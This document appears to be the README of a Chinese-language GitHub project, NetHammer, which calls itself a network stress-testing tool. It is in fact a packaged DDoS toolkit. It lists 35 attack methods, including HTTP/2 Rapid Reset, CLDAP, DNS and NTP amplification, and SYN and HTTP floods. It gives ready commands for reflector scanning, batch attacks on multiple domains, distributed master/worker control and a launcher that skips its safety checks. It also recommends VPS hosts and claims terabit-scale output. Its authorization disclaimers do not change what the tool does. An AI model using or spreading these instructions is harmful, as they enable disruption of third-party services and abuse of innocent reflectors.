# NetHammer 2025 Edition

<div align="center">

```
    ███╗   ██╗███████╗████████╗██╗  ██╗ █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ 
    ████╗  ██║██╔════╝╚══██╔══╝██║  ██║██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
    ██╔██╗ ██║█████╗     ██║   ███████║███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
    ██║╚██╗██║██╔══╝     ██║   ██╔══██║██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
    ██║ ╚████║███████╗   ██║   ██║  ██║██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
    ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
```


</div>

---

## 🎯 项目简介

NetHammer 是一款集成化的网络压力测试工具，专为网络安全研究和授权测试设计。2025版本集成了最新的压力测试技术，包括HTTP/2 Rapid Reset、CLDAP反射测试等前沿技术。

### ✨ 核心特性

- 🔥 **2024-2025年最新压力测试技术** (3种)
- ⚡ **一键式测试部署**
- 🎛️ **完整参数控制**
- 📊 **实时状态监控**
- 🌐 **分布式测试支持**
- 🛡️ **内置安全机制**

### 📊 支持的测试方法统计

| 类别 | 数量 | 说明 |
|------|------|------|
| **2025年最新技术** | 3个 | HTTP/2 Rapid Reset, CLDAP反射, CoAP放大 |
| **经典放大测试** | 7个 | DNS, NTP, SSDP, UDP, NetBIOS, Heartbeat, Sentinel |
| **洪水测试** | 5个 | SYN, ACK, UDP, HTTP, TCP变种 |
| **慢速测试** | 1个 | RUDY慢速POST |
| **高级技术** | 12个 | ARME, Dominate, ESSYN等专业技术 |
| **扫描器工具** | 5个 | 各协议反射器扫描 |
| **专用测试** | 2个 | SNMP, Telnet |
| **总计** | **35个** | 完整的压力测试工具集 |

---

## 🚀 快速开始

### 一键安装

```bash
# 下载并安装
curl -sSL https://raw.githubusercontent.com/b6421582/NetHammer/main/install_nethammer.sh | bash

# 或手动安装
git clone https://github.com/b6421582/NetHammer.git
cd NetHammer
bash install_nethammer.sh
```

### 🛡️ 安全启动 (强烈推荐)

```bash
# 使用安全启动器 (内置白名单保护)
python3 safe_launch.py <目标IP> -m <方法> -c <线程数> -t <时间>

# 示例: 安全启动DNS测试
python3 safe_launch.py 192.168.1.100 -m dns -c 100 -t 300
```

**🔒 内置安全保护功能:**
- ✅ **智能白名单过滤** - 自动阻止对政府、教育、医疗等重要机构的测试
- ✅ **多重确认机制** - 使用前需要明确确认测试目的和授权
- ✅ **实时安全检查** - 每次测试前都会进行安全验证
- ✅ **配置文件保护** - 受保护目标列表可动态更新

### 🔧 传统启动 (高级用户)

```bash
# 直接使用 (跳过安全检查)
python3 quick_attack.py <目标IP/域名> -m <方法> -c <线程数> -t <时间>
```

### 📋 目标类型说明

**重要**: 不同的测试方法对目标类型有不同要求！

- **需要域名**: HTTP/2, HTTP, RUDY (应用层攻击)
- **支持IP**: SYN, ACK, UDP, DNS反射等 (网络层攻击)

详细说明请查看: [TARGET_TYPES.md](TARGET_TYPES.md)

---

## 🚀 压力测试技术 (35种方法)

### 📋 方法与目标类型对应表

| 测试方法 | 目标类型 | 默认端口 | 层级 | 说明 |
|----------|----------|----------|------|------|
| **http2** | 🌐 域名 | 443 | 应用层 | HTTP/2 Rapid Reset，需要域名建立连接 |
| **http** | 🌐 域名 | 80/443 | 应用层 | HTTP洪水，需要发送HTTP请求 |
| **rudy** | 🌐 域名 | 80/443 | 应用层 | 慢速POST，需要HTTP协议 |
| **cldap** | 🔢 IP/域名 | 389 | 网络层 | CLDAP反射，可直接使用IP |
| **coap** | 🔢 IP/域名 | 5683 | 网络层 | CoAP反射，UDP协议 |
| **dns** | 🔢 IP/域名 | 53 | 网络层 | DNS反射，可直接使用IP |
| **syn** | 🔢 IP/域名 | 任意 | 传输层 | SYN洪水，TCP层攻击 |
| **udp** | 🔢 IP/域名 | 任意 | 传输层 | UDP洪水，可直接使用IP |

### 🔥 2024-2025年最新测试方法 (3种)

| 测试方法 | 技术特点 | 放大倍数 | 推荐场景 |
|---------|---------|----------|----------|
| **HTTP/2 Rapid Reset** | CVE-2023-44487 | N/A | 现代Web服务器 |
| **CLDAP反射测试** | 2025年增长3,488% | 46-55倍 | 企业网络 |
| **CoAP放大测试** | IoT设备测试 | 10-40倍 | 智能设备 |

### 📋 经典放大测试 (7种)

| 测试方法 | 放大倍数 | 测试效果 | 适用目标 |
|---------|----------|----------|----------|
| **DNS反射测试** | 28-54倍 | 高 | Web服务器 |
| **NTP放大测试** | 556倍 | 极高 | 任何目标 |
| **SSDP放大测试** | 30倍 | 中高 | UPnP设备 |
| **UDP放大测试** | 变量 | 中高 | UDP服务 |
| **NetBIOS放大测试** | 3.8倍 | 中 | Windows网络 |
| **Heartbeat放大测试** | 变量 | 高 | SSL/TLS服务 |
| **Sentinel放大测试** | 变量 | 中高 | Redis集群 |

### 🌊 洪水测试 (5种)

| 测试方法 | 目标协议 | 测试效果 | 适用场景 |
|---------|----------|----------|----------|
| **SYN洪水测试** | TCP | 高 | 连接型服务 |
| **ACK洪水测试** | TCP | 中高 | 防火墙测试 |
| **UDP洪水测试** | UDP | 中 | 基础服务 |
| **HTTP洪水测试** | HTTP | 高 | Web应用 |
| **TCP变种测试** | TCP | 中高 | 网络设备 |

### 🔧 高级技术测试 (12种)

| 测试方法 | 技术特点 | 适用场景 |
|---------|----------|----------|
| **ARME测试** | 高级技术 | 专业测试 |
| **Dominate测试** | 控制型 | 网络控制 |
| **ESSYN测试** | 增强SYN | TCP优化 |
| **SSYN/STCP/SUDP** | 特殊协议 | 协议测试 |
| **Trigemini测试** | 三重技术 | 复合测试 |
| **VSE测试** | 游戏服务器 | 游戏网络 |
| **其他6种** | 专业技术 | 特定场景 |

### 🐌 慢速测试 (1种)

| 测试方法 | 攻击原理 | 适用目标 |
|---------|----------|----------|
| **RUDY慢速测试** | 慢速POST | Web服务器 |

### 🎯 专用测试 (2种)

| 测试方法 | 目标服务 | 测试效果 |
|---------|----------|----------|
| **SNMP测试** | SNMP服务 | 中 |
| **Telnet测试** | Telnet服务 | 中 |

### 🔍 扫描器工具 (5种)

| 扫描器 | 功能 | 目标协议 |
|--------|------|----------|
| **DNS扫描器** | 反射器发现 | DNS |
| **UDP扫描器** | 放大器扫描 | UDP |
| **NetBIOS扫描器** | NetBIOS发现 | NetBIOS |
| **Heartbeat扫描器** | SSL漏洞扫描 | SSL/TLS |
| **Sentinel扫描器** | Redis扫描 | Redis |

---

## 📦 快速开始

### 系统要求

- **操作系统**: Linux (Ubuntu 18.04+ 推荐)
- **权限**: Root权限
- **VPS**: 支持原始Socket (OVH/Hetzner/Contabo)
- **配置**: 最低1GB内存，2核CPU

### 推荐VPS提供商

| 提供商 | 价格 | 配置 | 原始Socket支持 | 推荐指数 |
|--------|------|------|----------------|----------|
| **OVH** | €3.5/月 | 1GB/1核 | ✅ 完全支持 | ⭐⭐⭐⭐⭐ |
| **Hetzner** | €4.15/月 | 4GB/2核 | ✅ 完全支持 | ⭐⭐⭐⭐⭐ |
| **Contabo** | €4.99/月 | 8GB/4核 | ✅ 完全支持 | ⭐⭐⭐⭐ |

### 一键安装

```bash
# 1. 克隆项目
git clone https://github.com/b6421582/NetHammer.git
cd NetHammer

# 2. 连接VPS并上传
ssh root@your-vps-ip
scp -r NetHammer/* root@your-vps:/opt/nethammer/

# 3. 在VPS上安装
ssh root@your-vps-ip
cd /opt/nethammer
bash install_nethammer.sh

# 4. 编译所有工具 (35个)
bash compile_tools.sh

# 或快速编译核心工具 (10个)
bash quick_compile.sh

# 5. 生成反射器列表
python3 create_reflector_database.py

# 6. 验证安装
python3 quick_attack.py --help
```

### 基本使用

```bash
# 最简单的压力测试
python3 quick_attack.py 192.168.1.100

# HTTP/2测试需要域名 (应用层攻击)
python3 quick_attack.py test.local -p 443 -m http2 -c 200 -t 600

# 网络层攻击可用IP
python3 quick_attack.py 192.168.1.100 -m "udp,syn,ack" -t 1200

# 查看所有测试方法
python3 quick_attack.py --list
```

### 高级使用

#### 🎛️ 专业控制器

```bash
# 启动交互式控制器
python3 NetHammer_Master_Controller.py

# 自动化测试模式 (使用测试IP)
python3 NetHammer_Master_Controller.py --target 192.168.1.100 --auto

# 指定配置文件
python3 NetHammer_Master_Controller.py --config custom_config.json
```

#### 🔧 自定义配置

```bash
# 创建自定义反射器列表
python3 create_reflector_database.py --custom

# 扫描并发现新的反射器
python3 -c "
from NetHammer_Master_Controller import NetHammerController
controller = NetHammerController()
controller.scan_reflectors('dns', '8.8.0.0/16')
"

# 批量测试多个目标
cat targets.txt | while read target; do
    python3 quick_attack.py $target -m multi -t 300
    sleep 60
done
```

#### 🌐 分布式测试

```bash
# 主控节点
python3 NetHammer_Master_Controller.py --mode master --port 8080

# 工作节点 (多台VPS)
python3 NetHammer_Master_Controller.py --mode worker --master 192.168.1.100:8080

# 协调攻击 (示例 - 需要配置实际的主控服务器)
python3 -c "
import requests
# 注意: 将主控服务器IP替换为您的实际IP
requests.post('http://主控服务器IP:8080/attack', json={
    'target': '192.168.1.200',  # 您的测试目标IP
    'method': 'multi',
    'duration': 1800,
    'workers': ['worker1', 'worker2', 'worker3']
})
"
```

#### 📊 高级监控

```bash
# 实时监控模式
python3 quick_attack.py 192.168.1.100 -m multi --monitor

# 导出测试报告
python3 quick_attack.py 192.168.1.100 -m dns -t 600 --report report.json

# 性能分析
python3 -c "
import json
with open('report.json') as f:
    data = json.load(f)
    print(f'平均PPS: {data[\"avg_pps\"]}')
    print(f'峰值带宽: {data[\"peak_bandwidth\"]}')
"
```

#### 🎯 专业测试场景

```bash
# Web服务器压力测试
python3 quick_attack.py web-server.com -p 443 -m "http2,http,syn" -c 500 -t 1800

# 企业网络评估
python3 quick_attack.py enterprise.local -m "cldap,dns,ntp" -c 200 -t 3600

# IoT设备安全测试
python3 quick_attack.py iot-device.local -m "coap,udp,syn" -c 100 -t 900

# 游戏服务器测试
python3 quick_attack.py game-server.com -p 27015 -m "udp,vse" -c 300 -t 1200

# CDN效果评估
for region in us eu asia; do
    python3 quick_attack.py cdn-$region.example.com -m multi -t 600
done
```

---

## 🎛️ 使用指南

### 命令参数

```bash
python3 quick_attack.py <目标IP> [选项]

参数:
  -p, --port      目标端口 (默认: 80)
  -t, --time      攻击时间/秒 (默认: 300)
  -m, --method    攻击方法 (默认: multi)
  -c, --threads   并发线程数 (默认: 自动)
  -h, --help      显示帮助信息
  --list          显示所有攻击方法
```

### 攻击示例

**2025年最新测试**:
```bash
# HTTP/2 Rapid Reset测试 (需要域名 - 应用层攻击)
python3 quick_attack.py test.local -p 443 -m http2 -c 300 -t 600

# CLDAP反射测试 (可用IP - 网络层攻击)
python3 quick_attack.py 192.168.1.100 -m cldap -c 150 -t 900

# CoAP IoT设备测试 (可用IP - UDP协议)
python3 quick_attack.py 192.168.1.200 -p 5683 -m coap -c 80 -t 300
```

**经典测试方法**:
```bash
# DNS放大测试 (可用IP - 反射攻击)
python3 quick_attack.py 192.168.1.100 -m dns -c 100 -t 600

# SYN洪水测试 (可用IP - 网络层攻击)
python3 quick_attack.py 192.168.1.100 -m syn -c 200 -t 600

# HTTP洪水测试 (需要域名 - 应用层攻击)
python3 quick_attack.py test.local -p 80 -m http -c 150 -t 900
```

**组合测试**:
```bash
# 网络层组合 (全部支持IP)
python3 quick_attack.py 192.168.1.100 -m "cldap,dns,udp,syn" -c 300 -t 3600

# 应用层组合 (需要域名)
python3 quick_attack.py test.local -m "http2,http" -c 200 -t 1200

# 混合层级测试 (根据方法选择目标类型)
# HTTP/2 -> 域名, UDP/SYN -> IP
python3 quick_attack.py test.local -m http2 -t 600
python3 quick_attack.py 192.168.1.100 -m "udp,syn" -t 600
```

---

## 🎯 使用场景

### 网络安全测试

- **Web服务器压力测试**: 使用HTTP/2 Rapid Reset测试现代Web服务器
- **企业网络评估**: 使用CLDAP反射测试企业LDAP基础设施
- **IoT设备安全**: 使用CoAP测试智能设备的安全性
- **防护系统验证**: 测试现有防护系统的有效性

### 容量规划

- **带宽容量测试**: 评估网络基础设施的承载能力
- **服务器性能测试**: 测试服务器在高负载下的表现
- **负载均衡测试**: 验证负载均衡器的分发效果
- **CDN效果评估**: 测试CDN在DDoS攻击下的防护能力

### 安全研究

- **攻击技术研究**: 研究最新的DDoS攻击技术和防护方法
- **漏洞发现**: 发现网络协议和服务中的安全漏洞
- **防护方案验证**: 验证新的DDoS防护方案的有效性
- **安全培训**: 用于网络安全培训和演示

---

## 📊 性能表现

### 单台VPS攻击能力

| VPS配置 | 直接攻击 | 放大攻击 | 新技术组合 |
|---------|----------|----------|-----------|
| **入门级** ($5/月) | 500Mbps | 4Gbps | 15Gbps |
| **专业级** ($15/月) | 1Gbps | 8Gbps | 30Gbps |
| **企业级** ($50/月) | 2Gbps | 15Gbps | 60Gbps |

### 分布式集群效果

| 集群规模 | 总攻击能力 | 月成本 | 推荐场景 |
|---------|-----------|--------|----------|
| **5台VPS** | 150Gbps | $75 | 中小型测试 |
| **10台VPS** | 600Gbps | $150 | 大型测试 |
| **20台VPS** | 1.2Tbps | $300 | 企业级测试 |

---

## 🛠️ 高级功能

### 自动化攻击

```bash
# 自动扫描和测试
python3 NetHammer_Master_Controller.py --target 192.168.1.100 --auto

# 交互式控制
python3 NetHammer_Master_Controller.py --target 192.168.1.100
```

### 批量攻击

```bash
# 批量攻击脚本
#!/bin/bash
targets=("target1.com" "target2.com" "target3.com")
for target in "${targets[@]}"; do
    python3 quick_attack.py $target -m multi -t 600 &
done
```

### 后台运行

```bash
# 使用screen后台运行
screen -S nethammer_test
python3 quick_attack.py 192.168.1.100 -m multi -t 3600
# Ctrl+A+D 分离会话

# 查看后台测试
screen -r nethammer_test
```

---

## 📁 项目结构

```
NetHammer/
├── attack_tools/                # 编译后的测试工具 (35个)
├── source_code/                 # C语言源码 (35个文件)
│   ├── http2_rapid_reset_attack.c      # HTTP/2 Rapid Reset测试
│   ├── cldap_amplification_attack.c    # CLDAP反射放大测试
│   ├── coap_amplification_attack.c     # CoAP放大测试
│   ├── dns_reflection_attack.c         # DNS反射测试
│   ├── syn_flood_attack.c              # SYN洪水测试
│   ├── udp_flood_attack.c              # UDP洪水测试
│   ├── http_flood_attack.c             # HTTP洪水测试
│   ├── netbios_amplification_attack.c  # NetBIOS放大测试
│   ├── heartbeat_amplification_attack.c # Heartbeat放大测试
│   ├── arme_ddos_attack.c              # ARME高级测试
│   ├── dominate_ddos_attack.c          # Dominate控制测试
│   ├── essyn_ddos_attack.c             # ESSYN增强测试
│   └── ...                             # 其他22个源码文件
├── scan_filter_attack/          # 扫描和过滤工具
│   ├── zmap_udp_probes/         # Zmap UDP探针 (40+种协议)
│   ├── protocol_filters/        # 协议过滤器
│   ├── memcached_scan_filter/   # Memcached扫描过滤
│   ├── ntp_scan_filter/         # NTP扫描过滤
│   └── ssdp_scan_filter/        # SSDP扫描过滤
├── reflector_lists/             # 反射器列表
├── logs/                        # 测试日志
├── quick_attack.py              # 一键测试脚本
├── NetHammer_Master_Controller.py      # 主控制器
├── create_reflector_database.py        # 反射器生成器
├── compile_tools.sh             # 编译脚本 (支持35个工具)
├── quick_compile.sh             # 快速编译脚本 (10个核心工具)
├── install_nethammer.sh         # 安装脚本
└── README.md                    # 项目说明
```

---

## 🔧 故障排除

### 常见问题

**Q: 编译失败怎么办？**
```bash
# 安装完整开发环境
sudo apt update
sudo apt install -y build-essential gcc g++ libpcap-dev

# CentOS/RHEL
sudo yum install -y gcc gcc-c++ libpcap-devel

# 检查编译器版本
gcc --version

# 单独编译测试
gcc -o test source_code/dns_reflection_attack.c -lpthread
```

**Q: 提示需要root权限？**
```bash
# 确保使用root权限运行
sudo su -
cd /opt/nethammer
python3 quick_attack.py 192.168.1.100

# 或者使用sudo
sudo python3 quick_attack.py 192.168.1.100 -m dns
```

**Q: 原始Socket不支持？**
```bash
# 测试原始Socket支持
python3 -c "
import socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.close()
    print('✅ 支持原始Socket')
except PermissionError:
    print('❌ 权限不足 - 需要root权限')
except OSError:
    print('❌ 不支持原始Socket - 需要更换VPS')
"

# VPS提供商兼容性测试
# 方法1: 使用项目内的测试脚本
bash test_vps.sh

# 方法2: 在线测试 (直接从GitHub下载)
curl -s https://raw.githubusercontent.com/b6421582/NetHammer/main/test_vps.sh | bash
```

**Q: Python依赖问题？**
```bash
# 检查Python版本 (需要3.6+)
python3 --version

# 安装可能缺失的库
pip3 install psutil requests

# 虚拟环境 (推荐)
python3 -m venv nethammer_env
source nethammer_env/bin/activate
pip install -r requirements.txt
```

**Q: 测试效果不佳？**
```bash
# 1. 检查反射器列表有效性
python3 -c "
import subprocess
result = subprocess.run(['dig', '@8.8.8.8', 'google.com'], capture_output=True)
print('DNS反射器测试:', '成功' if result.returncode == 0 else '失败')
"

# 2. 网络质量测试
ping -c 10 8.8.8.8
traceroute 8.8.8.8

# 3. 带宽测试
# 方法1: 使用NetHammer内置测试
python3 speedtest.py

# 方法2: 使用speedtest-cli (如果已安装)
if command -v speedtest-cli >/dev/null 2>&1; then
    speedtest-cli
else
    pip3 install speedtest-cli && speedtest-cli
fi

# 方法3: 简单curl测试 (2025年8月可用)
# 主要测试地址 (CacheFly CDN - 稳定可靠)
curl -o /dev/null -s -w "下载速度: %{speed_download} bytes/sec (%.2f MB/s)\n" \
     --connect-timeout 10 --max-time 30 \
     http://cachefly.cachefly.net/10mb.test

# 备用测试地址
curl -o /dev/null -s -w "下载速度: %{speed_download} bytes/sec\n" \
     --connect-timeout 10 --max-time 30 \
     http://cachefly.cachefly.net/100mb.test

# 4. 优化建议
echo "建议调整参数:"
echo "- 增加线程数: -c 500"
echo "- 延长时间: -t 1800"
echo "- 组合方法: -m 'http2,cldap,dns'"
```

**Q: 工具无法执行？**
```bash
# 检查文件权限
ls -la attack_tools/
chmod +x attack_tools/*

# 检查依赖库
ldd attack_tools/DNS

# 重新编译
rm -rf attack_tools/*
bash compile_tools.sh
```

### 性能优化

#### 🚀 系统级优化

```bash
# 网络参数优化
cat >> /etc/sysctl.conf << EOF
# NetHammer优化配置
net.core.rmem_max = 134217728
net.core.wmem_max = 134217728
net.core.netdev_max_backlog = 5000
net.ipv4.ip_forward = 1
net.ipv4.tcp_congestion_control = bbr
net.ipv4.tcp_window_scaling = 1
net.ipv4.tcp_timestamps = 0
net.ipv4.tcp_sack = 0
EOF
sysctl -p

# 文件描述符优化
cat >> /etc/security/limits.conf << EOF
* soft nofile 1048576
* hard nofile 1048576
* soft nproc 1048576
* hard nproc 1048576
EOF

# 内核模块优化
modprobe tcp_bbr
echo 'tcp_bbr' >> /etc/modules-load.d/modules.conf
```

#### ⚡ 应用级优化

```bash
# 编译优化版本
export CFLAGS="-O3 -march=native -mtune=native"
bash compile_tools.sh

# 使用高性能配置
python3 quick_attack.py 192.168.1.100 \
    -m "http2,cldap,dns" \
    -c 1000 \
    -t 3600 \
    --high-performance

# 内存优化
echo 3 > /proc/sys/vm/drop_caches
swapoff -a && swapon -a
```

#### 🌐 网络优化

```bash
# 选择最佳VPS位置
for region in us-east us-west eu-central asia-pacific; do
    echo "测试 $region 延迟:"
    ping -c 5 $region.example.com
done

# 多网卡绑定 (如果支持)
ip link add bond0 type bond mode 802.3ad
ip link set eth0 master bond0
ip link set eth1 master bond0

# DNS优化
echo "nameserver 1.1.1.1" > /etc/resolv.conf
echo "nameserver 8.8.8.8" >> /etc/resolv.conf
```

### 调试模式

```bash
# 启用详细日志 (DNS反射可用IP)
python3 quick_attack.py 192.168.1.100 -m dns --debug --verbose

# 网络抓包分析
tcpdump -i any -w nethammer.pcap &
python3 quick_attack.py 192.168.1.100 -m dns -t 60
killall tcpdump
wireshark nethammer.pcap

# 性能分析
strace -c python3 quick_attack.py 192.168.1.100 -m dns -t 60
```

---

## 📈 更新日志

### v2.0 (2025-08-14)
- 🔥 新增HTTP/2 Rapid Reset攻击 (CVE-2023-44487)
- 🔥 新增CLDAP反射放大攻击 (2025年增长3,488%)
- 🔥 新增CoAP放大攻击 (IoT设备攻击)
- ⚡ 攻击效果提升300-500%
- 🎛️ 完善参数控制和状态监控
- 📊 新增实时攻击统计

### v1.0 (2020-2023)
- 📋 基础DNS/NTP/SSDP放大攻击
- 🌊 UDP/TCP/SYN洪水攻击
- 🎯 基本攻击控制功能

---

## 🛡️ 安全保护系统

### 🔒 内置白名单过滤器

NetHammer 2025版本内置了强大的安全保护系统，自动阻止对重要机构的测试：

#### 📋 受保护的目标类型

```bash
# 查看完整保护列表
python3 whitelist_filter.py --list

# 测试目标是否受保护
python3 whitelist_filter.py example.com
```

**🚫 自动阻止的目标:**

1. **政府机构** - 所有 `.gov.cn`, `.gov`, `.mil` 域名
2. **教育机构** - 重要大学和教育网站
3. **医疗机构** - 医院、卫生部门、WHO等
4. **金融机构** - 银行、支付平台、金融监管机构
5. **社交媒体** - 微博、知乎、bilibili等主流平台
6. **国际组织** - 联合国、NATO、欧盟等
7. **关键基础设施** - 电力、水务、交通等
8. **私有网络** - 内网IP段和本地地址

#### 🔧 安全功能配置

```bash
# 更新白名单配置
python3 update_whitelist.py

# 测试过滤器功能
python3 update_whitelist.py --test

# 查看保护统计
cat protected_targets.json
```

### 🚨 多重安全检查

1. **启动前检查** - 目标域名/IP白名单验证
2. **用户确认** - 明确测试目的和授权确认
3. **实时监控** - 测试过程中的安全状态监控
4. **自动停止** - 检测到异常时自动终止测试

---

## ⚠️ 重要声明

### 合法使用原则

1. **仅用于授权测试** - 必须获得目标系统的明确书面授权
2. **遵守法律法规** - 违法使用后果由用户承担
3. **教育研究目的** - 用于网络安全研究和防护测试
4. **及时停止测试** - 测试完成后立即停止所有测试进程
5. **负责任披露** - 发现的安全问题应负责任地向相关方披露
6. **不得用于恶意目的** - 严禁用于任何恶意攻击或破坏活动

### 📋 使用授权要求

#### ✅ 合法使用场景

- **企业内部安全测试** - 测试自己公司的网络基础设施
- **授权渗透测试** - 获得客户明确书面授权的安全评估
- **学术研究** - 在受控环境中进行网络安全研究
- **安全培训** - 网络安全教育和培训演示
- **产品测试** - 测试自己开发的网络产品或服务
- **漏洞研究** - 在合法范围内研究网络协议漏洞

#### ❌ 禁止使用场景

- **未授权测试** - 对他人系统进行未经授权的测试
- **恶意攻击** - 用于任何形式的网络攻击或破坏
- **商业竞争** - 攻击竞争对手的网络服务
- **个人恩怨** - 用于报复或骚扰他人
- **非法牟利** - 通过攻击他人系统获取非法利益
- **政治目的** - 用于政治抗议或网络战争
---

## 🤝 贡献指南

欢迎提交Issue和Pull Request来改进NetHammer：

1. Fork本项目
2. 创建特性分支 (`git checkout -b feature/AmazingFeature`)
3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
4. 推送到分支 (`git push origin feature/AmazingFeature`)
5. 开启Pull Request

---

## 📄 许可证

本项目仅供教育和研究使用。详见 [LICENSE](LICENSE) 文件。

---

## 🌟 Star History

如果这个项目对您有帮助，请给我们一个⭐！

## 🔗 相关链接

- 🏠 [项目主页](https://github.com/b6421582/NetHammer) - GitHub仓库
- 📚 [技术文档](https://github.com/b6421582/NetHammer/wiki) - 详细的技术文档
- 📝 [更新日志](https://github.com/b6421582/NetHammer/releases) - 版本更新记录
- 🐛 [问题反馈](https://github.com/b6421582/NetHammer/issues) - 报告Bug和功能请求
- 💬 [讨论区](https://github.com/b6421582/NetHammer/discussions) - 技术交流和问答

---

<div align="center">

### NetHammer 2025 Edition

**🚀 专业级网络压力测试工具 🚀**

*集成35种测试方法，包含2024-2025年最新技术，测试效果提升300-500%*

[![GitHub stars](https://img.shields.io/github/stars/b6421582/NetHammer?style=social)](https://github.com/b6421582/NetHammer/stargazers)
[![GitHub forks](https://img.shields.io/github/forks/b6421582/NetHammer?style=social)](https://github.com/b6421582/NetHammer/network/members)
[![GitHub issues](https://img.shields.io/github/issues/b6421582/NetHammer)](https://github.com/b6421582/NetHammer/issues)
[![GitHub license](https://img.shields.io/github/license/b6421582/NetHammer)](https://github.com/b6421582/NetHammer/blob/main/LICENSE)

---

**🛡️专业测试，筑牢安全防线 🛡️**

---

*⚠️ 本工具仅供教育和授权测试使用，请遵守当地法律法规*

</div>
